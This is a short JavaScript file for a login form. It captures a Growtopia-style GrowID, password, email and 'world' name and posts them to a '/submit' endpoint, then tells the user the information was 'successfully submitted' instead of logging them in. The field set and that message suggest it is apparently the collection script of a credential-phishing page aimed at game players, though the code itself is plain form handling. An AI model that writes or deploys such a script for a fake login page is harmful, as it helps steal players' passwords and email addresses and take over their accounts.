document.getElementById('loginForm').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent default form submission

    // Capture form data
    const growId = document.getElementById('growId').value;
    const password = document.getElementById('password').value;
    const email = document.getElementById('email').value;
    const world = document.getElementById('world').value;

    // Send the data to the server using fetch
    fetch('/submit', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            growId: growId,
            password: password,
            email: email,
            world: world,
        }),
    })
    .then(response => {
        if (response.ok) {
            return response.text(); // Get the response text
        } else {
            throw new Error('Failed to submit form');
        }
    })
    .then(data => {
        console.log(data); // Log server response
        alert('Your information has been successfully submitted!');
    })
    .catch(error => {
        console.error('Error:', error);
        alert('There was an error submitting your information. Please try again later.');
    });
});

